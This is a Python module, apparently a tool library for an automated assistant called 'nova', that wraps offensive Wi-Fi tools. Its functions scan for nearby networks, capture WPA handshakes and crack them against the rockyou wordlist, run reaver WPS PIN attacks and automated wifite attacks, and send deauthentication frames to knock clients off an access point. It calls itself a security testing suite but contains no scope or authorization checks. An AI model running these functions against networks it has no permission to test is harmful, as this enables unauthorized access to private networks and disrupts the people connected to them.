"""WiFi security testing suite.

Handshake capture, WPA cracking, WPS attacks, and automated auditing.
"""

import logging
import re
import subprocess
from typing import Any

logger = logging.getLogger("nova.wifi_security")


def _run(cmd: list[str], timeout: int = 30) -> str:
    try:
        completed = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout,
            check=False,
        )
        return completed.stdout.decode("utf-8", errors="replace")
    except FileNotFoundError:
        return f"ERROR: {cmd[0]} not installed"
    except subprocess.TimeoutExpired:
        return f"ERROR: command timed out after {timeout}s"


def scan_networks(interface: str) -> dict[str, Any]:
    """Scan for nearby WiFi networks using airodump-ng."""
    if not re.fullmatch(r"^[a-zA-Z0-9_-]{1,32}$", interface):
        return {"error": "invalid interface name"}
    output = _run(["airodump-ng", "--write", "/tmp/nova_wifi_scan", "--output-format", "csv", interface], timeout=30)
    if output.startswith("ERROR:"):
        return {"error": output, "fallback": _scan_fallback(interface)}
    networks: list[dict[str, str]] = []
    try:
        with open("/tmp/nova_wifi_scan-01.csv", "r") as f:
            lines = f.readlines()
            for line in lines:
                if "Station MAC" in line:
                    break
                parts = [p.strip() for p in line.split(",") if p.strip()]
                if len(parts) >= 6 and parts[0] != "BSSID":
                    networks.append({
                        "bssid": parts[0],
                        "channel": parts[3],
                        "encryption": parts[5],
                        "signal": parts[8] if len(parts) > 8 else "N/A",
                        "essid": parts[13] if len(parts) > 13 else "",
                    })
    except FileNotFoundError:
        pass
    return {"interface": interface, "networks": networks, "count": len(networks)}


def _scan_fallback(interface: str) -> list[dict[str, str]]:
    """Fallback WiFi scan using iwlist."""
    output = _run(["iwlist", interface, "scan"], timeout=15)
    networks: list[dict[str, str]] = []
    current: dict[str, str] = {}
    for line in output.splitlines():
        if "Cell" in line and "Address:" in line:
            if current:
                networks.append(current)
            mac_match = re.search(r"Address:\s*([0-9A-Fa-f:]{17})", line)
            current = {"bssid": mac_match.group(1) if mac_match else "", "essid": "", "encryption": "", "signal": "", "channel": ""}
        elif "ESSID:" in line:
            current["essid"] = line.split("ESSID:")[1].strip('"')
        elif "Encryption:" in line:
            current["encryption"] = "on" if "on" in line.lower() else "off"
        elif "Signal level=" in line:
            match = re.search(r"Signal level=(-?\d+)", line)
            if match:
                current["signal"] = match.group(1)
        elif "Channel=" in line:
            match = re.search(r"Channel=(\d+)", line)
            if match:
                current["channel"] = match.group(1)
    if current:
        networks.append(current)
    return networks


def capture_handshake(interface: str, bssid: str, duration: int = 30) -> dict[str, Any]:
    """Capture a WPA handshake from a specific AP."""
    if not re.fullmatch(r"^[a-zA-Z0-9_-]{1,32}$", interface):
        return {"error": "invalid interface name"}
    if not re.fullmatch(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
        return {"error": "invalid BSSID format"}
    output = _run([
        "airodump-ng", "-c", "1", "--bssid", bssid,
        "-w", "/tmp/nova_handshake", "--write-interval", "5",
        interface
    ], timeout=duration)
    if output.startswith("ERROR:"):
        return {"error": output}
    import glob
    cap_files = glob.glob("/tmp/nova_handshake*.cap")
    if cap_files:
        return {
            "status": "captured",
            "bssid": bssid,
            "interface": interface,
            "capture_file": cap_files[0],
            "duration": duration,
        }
    return {
        "status": "no_handshake",
        "bssid": bssid,
        "note": "Handshake not captured in this attempt. Try again or use deauth to force reconnection.",
    }


def crack_wpa(capture_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> dict[str, Any]:
    """Crack a WPA handshake using aircrack-ng with a wordlist."""
    if not capture_file.endswith(".cap"):
        return {"error": "capture file must be a .cap file"}
    import os
    if not os.path.exists(capture_file):
        return {"error": "capture file not found"}
    if not os.path.exists(wordlist):
        return {"error": f"wordlist not found: {wordlist}"}
    output = _run(["aircrack-ng", "-w", wordlist, capture_file], timeout=600)
    if output.startswith("ERROR:"):
        return {"error": output}
    key_found = "KEY FOUND!" in output
    password = ""
    if key_found:
        match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", output)
        if match:
            password = match.group(1)
    return {
        "capture_file": capture_file,
        "wordlist": wordlist,
        "key_found": key_found,
        "password": password,
        "raw": output[-2048:],
    }


def wps_attack(interface: str, bssid: str) -> dict[str, Any]:
    """WPS PIN attack using reaver."""
    if not re.fullmatch(r"^[a-zA-Z0-9_-]{1,32}$", interface):
        return {"error": "invalid interface name"}
    if not re.fullmatch(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
        return {"error": "invalid BSSID format"}
    output = _run([
        "reaver", "-i", interface, "-b", bssid,
        "-c", "1", "-S", "--max-attacks", "5"
    ], timeout=120)
    if output.startswith("ERROR:"):
        return {"error": output}
    wps_pin = ""
    wpa_psk = ""
    if "WPS PIN:" in output:
        match = re.search(r"WPS PIN:\s*'(\d+)'", output)
        if match:
            wps_pin = match.group(1)
    if "WPA PSK:" in output:
        match = re.search(r"WPA PSK:\s*'(.+?)'", output)
        if match:
            wpa_psk = match.group(1)
    return {
        "bssid": bssid,
        "interface": interface,
        "wps_pin": wps_pin,
        "wpa_psk": wpa_psk,
        "success": bool(wps_pin or wpa_psk),
        "raw": output[-2048:],
    }


def automated_wifite(interface: str) -> dict[str, Any]:
    """Run automated WPA attack with wifite."""
    if not re.fullmatch(r"^[a-zA-Z0-9_-]{1,32}$", interface):
        return {"error": "invalid interface name"}
    output = _run([
        "wifite", "-i", interface, "--wpa",
        "--dict", "/usr/share/wordlists/rockyou.txt",
        "--kill", "--max-attacks", "3"
    ], timeout=300)
    if output.startswith("ERROR:"):
        return {"error": output}
    cracks = []
    for line in output.splitlines():
        if "cracked" in line.lower() or "key" in line.lower():
            cracks.append(line.strip())
    return {
        "interface": interface,
        "cracks_found": len(cracks),
        "details": cracks,
        "raw": output[-4096:],
    }


def deauth_attack(interface: str, bssid: str, count: int = 5) -> dict[str, Any]:
    """Send deauth frames to disconnect clients from an AP."""
    if not re.fullmatch(r"^[a-zA-Z0-9_-]{1,32}$", interface):
        return {"error": "invalid interface name"}
    output = _run(["aireplay-ng", "--deauth", str(count), "-a", bssid, interface], timeout=30)
    if output.startswith("ERROR:"):
        return {"error": output}
    return {
        "bssid": bssid,
        "interface": interface,
        "deauth_count": count,
        "status": "sent",
        "raw": output[-1024:],
    }
